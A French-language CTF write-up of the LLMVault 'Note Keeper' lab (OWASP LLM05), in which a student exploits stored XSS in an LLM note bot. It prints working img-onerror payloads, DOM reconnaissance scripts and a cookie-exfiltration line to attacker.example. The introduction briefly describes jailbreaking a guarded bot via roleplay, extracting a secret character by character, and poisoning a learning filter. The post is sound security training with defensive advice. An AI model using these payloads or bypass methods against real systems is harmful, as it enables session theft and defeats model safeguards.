---
title: "Exploiter un XSS stocké dans une application de notes alimentée par un LLM"
date: 2026-11-21
draft: false
tags: ["llmvault", "owasp-llm-top-10", "llm05", "xss", "ai-security", "write-up"]
description: "Write-up d'un lab LLMVault (The Note Keeper, OWASP LLM05 : Improper Output Handling) : XSS stocké via un bot de notes, reconnaissance du DOM et exfiltration du flag."
---

*Write-up d'un challenge du lab LLMVault (OWASP LLM Top 10 2025, LLM05 : Improper Output Handling)*

## Contexte

Dans le cadre de ma spécialisation en cybersécurité et IA à Télécom SudParis, je m'entraîne sur **LLMVault**, un parcours de labs pratiques basé sur l'OWASP LLM Top 10 (2025) : une série de challenges où chaque lab fait interagir avec un bot vulnérable pour comprendre une classe de faille spécifique aux applications LLM.

Avant d'arriver sur ce challenge, j'étais passée par plusieurs labs de la série :

- **LLM01 — Prompt Injection** (*Roleplay Unchained*) : faire adopter un personnage à un bot gardé, puis l'amener à sortir de son rôle de sécurité par escalade progressive sur plusieurs tours.
- **LLM02 — Sensitive Information Disclosure** (*Death by a Thousand Hints*) : un bot refusant de révéler un secret directement, mais acceptant d'y répondre caractère par caractère, ce qui permet de reconstruire le secret par petites requêtes « inoffensives ».
- **LLM03 — Supply Chain** (*The Tampered Registry*) : comparaison de hashes déployés et de hashes canoniques pour détecter un modèle d'IA remplacé dans une chaîne de déploiement.
- **LLM04 — Data and Model Poisoning** (*Teach Me Wrong*) : empoisonnement progressif d'un filtre qui apprend de ses retours utilisateurs, jusqu'à lui faire classer une commande dangereuse comme sûre.

Ce write-up couvre le cinquième challenge, **LLM05 — Improper Output Handling**, qui porte sur une faille plus classique en sécurité web (XSS), mais déclenchée via la sortie d'un bot conversationnel.

## Le lab

Le challenge met en scène **NoteBot**, un petit assistant conversationnel qui propose deux commandes : `save note: ...` pour enregistrer une note, et `read note` pour l'afficher. La consigne du lab était simple : *« Il y a un élément caché sur cette page. »*

Ce genre d'énoncé, couplé à un bot qui « rejoue » ce qu'on lui donne, est un signal classique : la question à se poser n'est pas *qu'est-ce que je demande au bot*, mais *comment le bot affiche ce que je lui donne*.

## Le diagnostic : une sortie non filtrée

Quand une application affiche du texte fourni par un utilisateur, la bonne pratique est de l'**échapper** : convertir les caractères spéciaux comme `<` et `>` en entités HTML (`&lt;`, `&gt;`) pour qu'ils soient affichés tels quels, et non interprétés comme du code.

NoteBot ne fait pas ça. Il insère vraisemblablement la note directement via quelque chose comme `element.innerHTML = note`, sans assainissement. On peut le vérifier en une requête :

```
save note: <b>test</b>
read note
```

Si le mot « test » s'affiche en gras plutôt que littéralement, c'est confirmé : la sortie du bot est injectée telle quelle dans le DOM. On a un **XSS stocké** : le payload est persistant (stocké côté serveur ou côté session) et s'exécute à chaque lecture.

## L'exploitation : pourquoi `<img onerror=...>` plutôt que `<script>`

Le réflexe pour injecter du JavaScript est de penser à la balise `<script>`. Mais les navigateurs n'exécutent pas le JavaScript contenu dans une balise `<script>` quand elle est insérée a posteriori via `innerHTML` : c'est une protection native du DOM.

En revanche, les **attributs porteurs d'événements** (`onerror`, `onload`, `onclick`...) s'exécutent bien, eux, même dans ce contexte. D'où le détournement classique :

```html
<img src=x onerror="/* code JS ici */">
```

`src=x` pointe vers une ressource invalide. Le navigateur échoue à charger l'image, déclenche automatiquement l'événement `onerror`, et exécute le JavaScript qu'on y a placé. On ne demande jamais explicitement au navigateur d'exécuter du script : on provoque une erreur dont la gestion native sert de vecteur d'exécution.

## La reconnaissance : trouver l'aiguille dans la page

Première tentative, trop large :

```html
<img src=x onerror="document.querySelectorAll('[style*=display]').forEach(e=>e.style.display='block')">
```

Résultat : tout ce qui était caché sur la page redevenait visible, y compris une carte de félicitations sans rapport, normalement réservée à la fin complète du parcours. Du bruit, pas du signal.

Approche plus ciblée : filtrer par mot-clé plutôt que tout révéler d'un coup.

```html
<img src=x onerror="alert(Array.from(document.querySelectorAll('*')).filter(e=>/flag|secret|vault/i.test(e.id+e.className)).map(e=>e.outerHTML.slice(0,100)).join('\n'))">
```

Cette fois, un élément précis ressort :

```html
<div class="secret-flag sf-hidden">🚩 Hidden element revealed via your injection — LLMVAULT{...}</div>
```

## L'exfiltration : le piège de la troncature

Première lecture via `alert(...)` : le flag apparaît tronqué. J'ai d'abord soupçonné `alert()`, une boîte de dialogue basique qui n'est pas faite pour de longues chaînes. Mais la vraie cause se trouvait dans mon propre filtre : j'avais écrit `e.outerHTML.slice(0,100)`, qui coupe volontairement chaque élément à 100 caractères. Comme le texte qui précède le flag occupe déjà plus de 80 caractères, la fin du flag passait au-delà de la limite. Retirer le `.slice(0,100)` aurait déjà suffi.

La leçon : quand une sortie semble tronquée, vérifier d'abord son propre code avant d'accuser l'outil d'affichage.

Pour récupérer le flag en entier de façon fiable, une autre approche est de ne pas l'afficher du tout, mais de le **copier directement dans le presse-papiers** :

```html
<img src=x onerror="navigator.clipboard.writeText(document.querySelector('.secret-flag').textContent)">
```

`document.querySelector('.secret-flag')` cible l'élément repéré, `.textContent` en extrait le texte intégral, `navigator.clipboard.writeText(...)` le place dans le presse-papiers système. Un simple `Cmd+V` ensuite donne la chaîne complète, sans troncature.

## Pourquoi c'est réaliste

Ce challenge reproduit fidèlement un schéma d'attaque réel :

1. **Faille** : une sortie non assainie, qu'elle vienne d'un utilisateur ou, comme ici, d'un LLM qui restitue du contenu sans filtrage.
2. **Injection** : un vecteur détourné (`onerror`) pour contourner les protections natives sur `<script>`.
3. **Reconnaissance** : une recherche ciblée dans le DOM plutôt qu'un balayage brutal.
4. **Exfiltration** : une méthode fiable pour récupérer la donnée en entier.

Dans un contexte réel, un attaquant ne se contente généralement pas d'un `alert()` de preuve de concept : il vise des cookies de session, des tokens d'authentification ou des données sensibles, et les envoie discrètement vers un serveur qu'il contrôle, par exemple :

```javascript
fetch('https://attacker.example/collect?data=' + document.cookie)
```

## Les enseignements côté défense

- **Échapper systématiquement toute sortie** avant affichage : utiliser `textContent` plutôt que `innerHTML` quand le contenu n'a pas besoin d'être interprété comme du HTML.
- **Assainir le HTML** si du balisage riche est vraiment nécessaire, avec une bibliothèque dédiée (DOMPurify, par exemple), jamais à la main.
- **Mettre en place une Content Security Policy (CSP)** interdisant les scripts inline et restreignant les sources exécutables.
- **Ne jamais faire confiance à la sortie d'un LLM** comme on ne fait pas confiance à une entrée utilisateur : un modèle qui restitue du contenu « stocké » reste un vecteur d'injection si rien ne filtre ce qu'il renvoie.

---

*Ce write-up s'inscrit dans l'exploration du lab LLMVault, couvrant les failles de l'OWASP LLM Top 10 (2025). LLMVault est un projet de CyberSunil (licence MIT) : <https://github.com/CyberSunil/LLMVault>. Il est volontairement vulnérable : toutes les manipulations décrites ici ont été faites sur une instance locale, à des fins d'apprentissage. Ne testez jamais ces techniques sur un système qui ne vous appartient pas ou sans autorisation écrite.*
